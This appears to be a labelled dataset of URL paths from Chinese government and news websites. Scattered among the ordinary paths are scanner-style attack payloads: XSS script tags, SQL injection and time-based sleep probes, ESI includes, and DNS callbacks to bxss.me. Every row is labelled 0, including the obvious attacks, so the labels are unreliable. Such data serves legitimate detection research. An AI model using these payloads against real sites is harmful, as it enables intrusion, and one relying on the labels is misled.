sentences	labels
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7533\u60e0\u971e\u978b\u5e97 	 0
2016zt/******/2021/02/01/javascript:window.close(); 	 0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqskylgbjdaj/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a> 	 0
/***/interface/comul_total.json.jsp?callback=jquery19108432522736320645_1640034767481 	 0
xwzx/****/bmleft%' and 2*3*8=6*8 and 'jlxd'!='jlxd%.html 	 0
/****/czgk/bmjs/zzqfyxt/ldxrmfy/">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a> 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u6c7d\u8f66\u7f8e\u5bb9\u517b\u62a4\u4e2d\u5fc3 	 0
gjcp/*****/dash_additem.php?additem_form=alert(777); 	 0
/zwxx_11337/****/202109/t20210915_3031986.html 	 0
/****/czgk/bmjs/zzqfyxt/ltqrmfy/201808/t20180816_977458.html 	 0
zwgk/******/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/gys.htm 	 0
/******/system/2021/02/24/013340376.shtml 	 0
/****/wdsjs/hfswsj/202010/t20201026_173416_wap.html 	 0
/******/ew/20170620142501488002.png 	 0
/****/yqyb/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png 	 0
synr/****/201412/ 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u8010\u5fb7\u540d\u54c1\u670d\u88c5\u5e97 	 0
/***/0/00/22/65/226505_772053.jpg 	 0
2021zt/******/2021/03/08/javascript:void(0); 	 0
english/*******/art/index.shtml/""><script>alert(43)</script> 	 0
was5/***/search?channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(44773)</script> 	 0
ztzl/*********/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 	 0
/*****/h1593625441.html 	 0
socket.gethostbyname('hitas' 'hocznnju007c7.bxss.me.')[3].to_s) '/******/index.html 	 0
vc'||'/**/lib/jquery/jquery.min.js 	 0
/**********/system/2020/12/18/013304976.shtml 	 0
/**********/system/2021/05/14/013385119.shtml 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery19105526330805537587_1639980485316 	 0
vc/**/lib/easyui/themes/http://bxss.me/t/fit.txt?.jpg/linkbutton.css 	 0
lcgg/********/javascript:void(0); 	 0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u91d1\u6e2f\u5de5\u8d38\u6709\u9650\u8d23\u4efb\u516c\u53f8 	 0
/****/201909/t20190926_1757309.html 	 0
/******/fy/jd 	 0
/****/ygzpxx/202010/ywzzq/nbfw/rlzy/jypx/ywly/myyfw/xwzx/gjmt/jtwxq/images/jianfan.js 	 0
/****/qzfwj/202109/t20210929_3062105.html 	 0
/****/201909/t20190926_1757084.html 	 0
/****/tzgg/202008/t20200806_2181069_zzb.html 	 0
/**********/system/2020/05/29/013173612.shtml 	 0
ywly/*****/index.html?*/-->'""></iframe></script></style></title></textarea><script >alert(40319)</script>= 	 0
'""()&%<acx><script >04kx(9670)</script>/******/list.html 	 0
col/*****/index.html/""><script>alert(3599)</script> 	 0
xwzx/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 0
/****/ydylsdgjjt/tsydyl/201705/t20170527_155400.html 	 0
ywly/*****/index.html?continent=' and 1197=1197 and '1'='1 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u79d1\u5e7b\u7f51\u6587 	 0
/***/0/02/12/44/2124411_997248.jpg 	 0
/***/viewspace-960.html 	 0
swld/******/2021/11/29/javascript:window.close(); 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u4ea8\u901a\u8fbe\u6c7d\u8f66\u88c5\u6f62\u4e2d\u5fc3 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6f6e\u6d41\u7537\u88c5\u9986 	 0
/*****/20210906/10403.html 	 0
/****/qzfwj/201801/t20180115_668804.html 	 0
ddjs/*****/service/166/exec 	 0
2011zt/******/2011/11/24/010546692.shtml 	 0
pic/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 0
/zwxx_11337/****/202109/t20210916_3033465.html 	 0
/****/gcjl/ 	 0
xxgk/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new=0.7709305099762387<esi:include src=""http://bxss.me/rpb.png""/> 	 0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5f90\u5de7\u73b2\u7c73\u7ebf\u5e97 	 0
e/******/viewclick/?addclick=1&classid=105&id=1 waitfor delay '0:0:12.981' --  	 0
/*/0w3f7k7z2/ecmsinfo.php 	 0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u9e3f\u798f\u987a\u6c49\u9910\u9986 	 0
/zwxx_11337/****/201912/t20191219_1896624.html 	 0
/******/qhqy/qhyh/ 	 0
/***/0/01/49/31/1493136_987794.jpg 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6731\u5e7f\u5b81\u8d27\u8fd0\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u4e07\u5a77\u5a77\u519c\u526f\u4ea7\u54c1\u6d41\u901a\u7ecf\u7eaa\u4eba 	 0
/****/zgsdt/2021_qydt/202111/qywh/ 	 0
/**********/system/2021/10/23/013468940.shtml 	 0
/zwxx_11337/****/201910/t20191024_1813046.html 	 0
socket.gethostbyname('hitbb' 'raxxhmlq51a15.bxss.me.')[3].to_s) '/***/page.css 	 0
/******/public/2021/12/02/20211202_17d7a44ccb5_r1.mp4 	 0
/**********/system/more/212000000000000/0015/212000000000000_00001585.shtml 	 0
/****/whhd/202011/t20201125_256633.html 	 0
zwgk/******/gytdsdfwzs/zws/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 0
/******/system/2018/03/11/012562823.shtml 	 0
xxgk/******/list.html?new='.gethostbyname(lc('hitkf'.'vhpbrezfc2b4b.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(108).chr(74).chr(107).chr(81).' 	 0
main/*****/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 	 0
/**********/system/2021/03/03/013344111.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5f20\u7389\u971e\u8089\u5e97 	 0
/*******/qiye/b-e2002894.html 	 0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u5149\u660e\u773c\u955c\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u4e09\u751f\u77f3\u88c5\u9970\u5de5\u7a0b\u8bbe\u8ba1\u6709\u9650\u516c\u53f8 	 0
news/********/fazhanzhanlue?page=1 and 7194=9415 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u8d85\u5468\u5e9f\u54c1\u6536\u8d2d\u7ad9 	 0
/**********/system/2021/12/19/013496706.shtml 	 0
/*******/qiye/b-e1085134.html 	 0
qtyz/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
/***/0/01/22/50/1225016_596729.jpg 	 0
module/**********/visit.jsp?type=3&i_articleid=239572&i_columnid=37&i_webid=1 and 1=1 	 0
module/********/down.jsp?i_id=194814&colid=72' and 3163=3163 and 'hnst'='hnst 	 0
/****/2021/10/80559.html 	 0
/*****/gy48/cpgyss.asp?key=bp\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\u0328\ufffd\ufffd 	 0
/***/blockdata/getsearchinfo.do?&title=\u6842\u6797\u5e73\u4e50\u7a0e\u52a1 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u7eff\u6e90\u706f\u5e97 	 0
module<esi:include src=""http://*******/rpb.png""/>/jslib/ckplayer/ckplayer.js 	 0
ssjn/****/lswh/201911/t20191122_http://bxss.me/t/xss.html? 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5c0f\u90ed\u94a3\u91d1\u70e4\u6f06\u90e8 	 0
jsearchfront/******/mainframe.do?begin=20201023&end=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 	 0
swwj/******/2021/09/15/javascript:window.print() 	 0
rlzy/********/index.jsp?locale=""><script>alert(777)</script> 	 0
/***/0/00/86/82/868211_898588.jpg 	 0
xxgk//***********/lzyj/ 	 0
/****/xqldly/hfbyqz/202008/t20200829_171650.html 	 0
/****/201909/t20190926_1756559.html 	 0
index/******/2021/02/22/javascript:void(); 	 0
/**/system/2021/12/08/012228284.shtml 	 0
/*****/system/2009/03/19/002710367.shtml 	 0
/*****/system/2015/07/13/011765388.shtml 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u7a0e\u8bda\u8d77\u91cd\u8bbe\u5907\u7ecf\u9500\u90e8 	 0
zwgk%' and 2*3*8=6*8 and '2mbs'!='2mbs%/*****/gcjsbz_sjbz/1.htm 	 0
/zwxx_11337/****/index_5.html 	 0
/***/advert?data={"ad_type":5,"channel_type":4,"channel_id":12007,"place_id":"fm_sp_ard","news_id":"1250538"} 	 0
newscenter/******/2014/05/20/011401969.shtml 	 0
/*******/zwgk/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqlyhcyj/ 	 0
/****/rsrm/201701/w020170728623043918353.jpg 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u201c\u5feb\u5546\u52a1\u201d 	 0
/****/zhengce/zfwjn/201904/t20190415_116400.html 	 0
inc/*********/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 	 0
/**********/system/2020/06/10/013182629.shtml 	 0
/*******/gygj/gygj/gjcp/hbsb/ywzzq/wzdt/lxwm/xwzx/xydt/ 	 0
/*****/system/2016/05/20/012009800.shtml 	 0
/******/system/2020/05/18/013163813.shtml 	 0
/***/0/01/67/23/1672326_949808.jpg 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7ed3\u5a5a 	 0
/**********/system/2021/06/14/013401780.shtml 	 0
/**********/system/2021/08/16/013435389.shtml 	 0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u798f\u4fe1\u767e\u8d27\u5546\u5e97 	 0
/*****/b-e769750.html 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin//xfs.bxss.me/hzrecorder.js 	 0
vc/**/widgets/scrollup/css/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/image.css 	 0
xxgk/******/tjj/zfxxgkml_2127/lzyj/list.html?new=bxss.me 	 0
/****/b-e428521.html 	 0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5f00\u5c4f\u5e7f\u544a 	 0
xwzx/****/2021_mtgz' and 2*3*8=6*8 and 'pdqd'='pdqd/202103/t20210314_271326.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u91d1\u79ef\u9547\u517b\u751f\u5802\u5065\u5eb7\u670d\u52a1\u4e2d\u5fc3 	 0
/**********/system/2020/06/14/013184979.shtml 	 0
/**********/system/2021/12/02/013488851.shtml 	 0
/****/tzgg/tz16/201607/'http:/leyubet1410.com/' 	 0
newscenter/******/2021/10/04/javascript:void(); 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9773\u632f\u660e\u9488\u7ec7\u5185\u8863\u7ecf\u9500\u90e8 	 0
/******/system/2007/07/10/002157343.shtml 	 0
/****/ 	 0
/**********/system/2021/12/01/013488300.shtml 	 0
was5//***/uletn651/xhr_send?t=1632328980966 	 0
/****/ezgg/ezscjy/201609/t20160905_98909.html 	 0
/zwxx_11337/****/202111/t20211102_3112250_zzb.html 	 0
lcgg/********/javascript:void(0); 	 0
/****/xydt/gzxwhydt/?xwzx/xydt/gzxwhydt/201412/t20141218_47434.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u9a6c\u8363\u767e\u5408\u5e97 	 0
/zwxx_11337/***/index_2.html 	 0
/****/tzgg/2012tzgg/201412/mailto:\u5c06\u7b80\u5386\u53d1\u81f3zdming1024@sina.com 	 0
/******/xzcf/gys_33720/szbm_33721/scjdglj_33746/ 	 0
xwdt'||'/****/czjs/zcwj/1.htm 	 0
/****/ysqgk/sy.html?id=77 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1') or 4689=4689 and '1'='1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7948\u798f 	 0
investors-garden/**********/video/javascript:void(0) 	 0
kefuzhongxin/common-problem'||'/***************/2017-01-24/197.html 	 0
icons/*********/index/41730?did=4&period=3"">alert(/777/) 	 0
/**/system/2011/12/23/010587221.shtml 	 0
z/210607'""()&%<acx><script >bhug(9737)</script>/*****/3494307764da7f36733716be7abc7a9b.js 	 0
/**********/system/2020/06/22/013190982.shtml 	 0
/******/t20210216_270570.html 	 0
/**/system/2021/12/04/012227407.shtml 	 0
/******/usercenter/index?qrcode=quicklyrq,3,152124,10055101 	 0
/****/xh/hd/201710/t20171016_518527.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a&page=10 	 0
/*******/qiye/b-e2245499.html 	 0
/****/web/search?page=69&channelid=222832&searchword=\u738b\u548c\u5c71&keyword=\u738b\u548c\u5c71&perpage=20&outlinepage=10 	 0
module/********/down.jsp?i_id=194814&colid=72') and 5022=5022 and ('vgqf'='vgqf 	 0
/*****/system/2010/03/22/010080848.shtml 	 0
/****/system/2017/01/13/012225033.shtml 	 0
info/****/1395.htm 	 0
inc/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u591a\u591a\u86cb\u7cd5\u5c4b 	 0
/********/ddjs/wzdt/ywly/rlzy/rcln/gjcp/nyjx/ 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u65b0\u7a7a\u95f4\u8bbe\u8ba1\u5de5\u4f5c\u5ba4 	 0
/zwxx_11337/****/201707/t20170727_301897.html 	 0
/****/xqdt/pcq/202111/t20211123_196851.html 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 2161=2161  	 0
/****/zfgzbg/201611/t20161110_317075.html 	 0
n42742/******/c1722882/content'||'.html 	 0
newscenter/******/2021/12/21/javascript:window.print() 	 0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqdwbgt/201908/t20190808_1656412.html 	 0
/****************/notification?access_token=ea1e94b5-e72d-48e5-a008-16649cb03e09&id=undefined 	 0
/zwxx_11337/****/202105/* 	 0
zfld/******/2021/02/21/javascript:window.print() 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5a1c\u4f9d\u811a\u843d\u978b\u5e97 	 0
/****/b-e775104.html 	 0
news/********/chukoufengxianyujing?page=1 and 6850=6850# 	 0
dcwj/******/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u60e0\u519c\u533a\u4f9d\u96c5\u4f18\u7f8e\u5bb9\u7f8e\u4f53\u4f1a\u6240 	 0
ywly/****/txgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\u0479\u0479\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3dab 	 0
/***/003/004/472/00300447284_6a4445a4.jpg 	 0
/****/bmkx/ssjj/201704/t20170425_89299.html 	 0
/***/003/003/908/00300390823_061f93a2.jpg 	 0
/******/2013qhlh/ycrc/ 	 0
vc/**/widgets/scrollup/css/themes//xfs.bxss.me.css 	 0
/***/0/00/27/25/272503_312257.jpg 	 0
index/******/2007/11/06/002247469.shtml 	 0
/**********/system/2021/12/20/013496871.shtml 	 0
/******/lzqh/js/ 	 0
/***/getsubject?data={"subject_id":232,"channel_type":10,"page":1,"page_size":15,"account_id":3653,"sign":""} 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5c0f\u9a6c\u5f00\u9501\u5e97 	 0
/****/pic/3.jpg 	 0
/****/bmkx/jtysj/202008/t20200828_171617.html 	 0
/***/getdetail?data={"news_id":"1263584","diversion_id":"","sign":""} 	 0
/**/system/2021/12/21/012232187.shtml 	 0
zwgk/******/ncwywfgz/wzs/hsbq/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6d2a\u4fdd\u5e9f\u65e7\u6536\u8d2d\u7ad9 	 0
qhly/******/2021/05/01/javascript:dozoom(14) 	 0
/***/0/01/90/24/1902459_024374.jpg 	 0
bdt/****/index.shtml/"><script>alert(216)</script> 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6bcd\u963f\u8a07\u725b\u7f8a\u8089\u5e97 	 0
module/***/jpage/theme/simple/css/jpage'||'.css 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5c0f\u859b\u670d\u88c5\u5e97 	 0
/****/bmkx/swjw/201610/t20161025_9099.html 	 0
xxgk/zzxxgk'||'/***/ 	 0
/**********/system/2020/04/10/013136685.shtml 	 0
/zwxx_11337/****/201912/t20191219_1896653.html 	 0
newscenter/******/2021/10/07/javascript:window.print() 	 0
/***/0/00/05/11/51176_855476.jpg 	 0
/**********/system/2016/01/06/011905988.shtml 	 0
/******/hfjtxz/202110/t20211031_196022.html 	 0
ztpd/***********/js/f o),v.ifmodified&&(k.lastmodified[f]&&t.setrequestheader( 	 0
/*****/gy48/cpgyss.asp?key=\u547c\u5438\u5668\u5145\u6c14\u6cf5&l=\ufffd\ufffd\ufffd\u0279\ufffd 	 0
/****/bmkx/sajj/201905/t20190515_123473.html 	 0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=sifa¤tpage=20&query=java 	 0
jsearchfront/********/jcse/110105008056111/16//xfs.bxss.me/result.css 	 0
yqlj/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 0
/***********/zaojianpinglun/?_=1640025041323 	 0
/****/wlzj/202103/t20210315_2626883.html 	 0
/**********/system/2018/05/05/012604156.shtml 	 0
zwgk/****/bmyjs/gmzdp/zzqjsxs/\"javascript:void(0)\" 	 0
/*******/qiye/20211118/e139409079.html 	 0
/zwxx_11337/****/201808/t20180827_1020627.html 	 0
/*****/ywly/yqlj/wzdt/qywh/gjcp/lyjx/ 	 0
/****/xqdt/byq 	 0
/*******/201906031630517723 	 0
xwdt/****/csjs/zcwj%' and 2*3*8=6*8 and 'or6s'!='or6s%/1.htm 	 0
/hire_prd/*****/static/js/manifest.694eb7709d453656ed3f.js 	 0
xwzx/****/jtwxq/ and 1>1 	 0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u8f66\u4e4b\u9a7f\u94a3\u91d1\u70e4\u6f06\u5e97 	 0
/******/uploadpic/image/20190603/1559545663946527.jpg 	 0
2017zt/******/2017/11/15/javascript:window.close(); 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery111103300398461009403_1640054250533 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 7247=9617  	 0
/****/20201011/e107936097.html 	 0
xxgk/******/'.gethostbyname(lc('hitsp'.'ufxrhpeicd83c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(112).chr(72).chr(103).chr(90).'/zfxxgkml_2127/jytabljg_2061/list.html 	 0
ldzc/****/201907/t20190704_139319.html?leader=bxss.me/t/xss.html? 	 0
/***********/zaojianpinglun/?_=1640034934054 	 0
/****/whhd/202011/t20201125_256634.html 	 0
/***/0/02/09/76/2097653_556048.png 	 0
xxgk/http://*******/t/fit.txt?.jpg/tjj/ 	 0
/***/0/00/70/57/705713_234335.jpg 	 0
/********/fortunewheel/fortune/check 	 0
/****/zfcwhy/202108/t20210818_2978219.html 	 0
/****/qzfwj/201911/t20191127_1864908.html/index_1.html 	 0
/***/index.php?i=8&c=home&a=page&id=286 	 0
/****/system/count/0036061/004000000000/count_page_list_0036061004000000000.js 	 0
zwgk/zfxxgk1%' and 2*3*8=6*8 and 'aazd'!='aazd%/********/1.htm 	 0
/***/2019/3/6/art_121_182747.html 	 0
system/********/interview/room.jsp?wbinterviewid=1033' and 8473=0332  	 0
xxgk/*****/1088/1099/list.html?new=/xfs.bxss.me 	 0
/****/system/2021/04/27/012156524.shtml 	 0
/****/qzfwj/201801/t20180115_668855.html 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery191038039548279832136_1639972889646 	 0
/******/sbd/yc.html 	 0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u559c\u53e3\u51c9\u76ae\u5e97 	 0
/***/0/00/23/61/236176_882764.jpg 	 0
/******/usercenter/index?qrcode=84426 	 0
/****/bmkx/sfgw/201610/t20161025_14170.html 	 0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u864e\u6d9b\u6c34\u6ce5\u7ecf\u9500\u90e8 	 0
col/*******/index.html"" and ""x""=""y 	 0
zfld/javascript:window.external.addfavorite('http:/**************/zfld/','中共青海省委领导活动报道集') 	 0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u8c46\u5236\u54c1\u5382\u9752\u9547\u8c46\u5236\u54c1\u95e8\u5e02\u90e8 	 0
/****/201909/t20190926_1757239.html 	 0
xxgk' and 2*3*8=6*8 and 'nsgi'='nsgi/******/list.html 	 0
jsearchfront/********/jcse/110105008056111/16/images'""()&%<acx><script >cfou(9910)</script>/result.css 	 0
/*******/qiye/b-e1605471.html 	 0
/****************/file/downloadimage/?id=a85c28ad-0cba-41f9-9567-562224120ac5 	 0
module/***/jpage/theme'""()&%<acx><script >9x6a(9174)</script>/simple/css/jpage.css 	 0
/*****/index/detail/art_id/118.html 	 0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u77f3\u6c9f\u9a7f\u5174\u9686\u996d\u9986 	 0
/****/bm/?id=./5259/5262/zw/201711/201711/201711/images/jquery-1.9.1.min.js 	 0
/******/1/jquery.ellipsis.js 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u7164\u96c6\u56e2\u7075\u65b0\u77ff\u6587\u5316\u4e2d\u5fc3 	 0
fxgg/********/javascript:void(0); 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery19104756856663707161_1639991293778 	 0
zzsl/'""()&%<acx><script >pbjz(9706)</script>/******/t20210723_2938511.html 	 0
/****/bmkx/scl/202108/w020210809628985359432.png 	 0
xwdt/*****/559.htm 	 0
/**********/system/2020/02/23/013093321.shtml 	 0
pic/******/common/signin.aspx?cbautosignin=""alert(777) 	 0
/*******/zwgk/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqfpb/ 	 0
yqlj/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 0
system/********/js%' and 2*3*8=6*8 and 'cxve'!='cxve%/vsb_news_search.js 	 0
zfld/******/2021/09/07'""/>\</script\>\<svg/onload=alert(1526) width=100\/>/013446963.shtml 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u878d\u6069\u88c5\u9970\u6750\u6599\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6d77\u52c7\u9557\u7f38\u78e8\u8f74\u8f66\u5e8a\u52a0\u5de5\u4e2d\u5fc3 	 0
/**/viewspace-996.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u79c0\u82b1\u670d\u88c5\u5e97 	 0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/nxrbbyjt/201702/t20170208_318024.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9a7f\u8def\u901a\u6c7d\u8f66\u7ef4\u4fee\u670d\u52a1\u90e8 	 0
/zwxx_11337/****/201810/t20181018_1130988.html 	 0
/***/preinvoice/preinvoiceview 	 0
jsearchfront<esi:include src=""http://*******/rpb.png""/>/template/jcse/110105008056111/16/images/common.js 	 0
/*******/qiye/9v2fls_20_e143514088.html 	 0
module/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*****/jquery.jpage.js 	 0
was5/***/sa3/addholiday.do 	 0
lz/****/tipsloginsubmit.action 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u6f58\u751f\u56fd\u5efa\u7b51\u8bbe\u5907\u79df\u8d41\u7ad9 	 0
/****/xxgkml/hygq_3720/rdhy/list_10.html 	 0
/*****/system/2016/05/20/012009813.shtml 	 0
/zwxx_11337/****/202010/t20201014_2255695.html 	 0
/***/0/02/12/44/2124428_203139.jpg 	 0
/****/36hs2w-syxw-e106241240.html 	 0
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqybj/\"javascript:void(0)\" 	 0
/****/20200526/e101308057.html 	 0
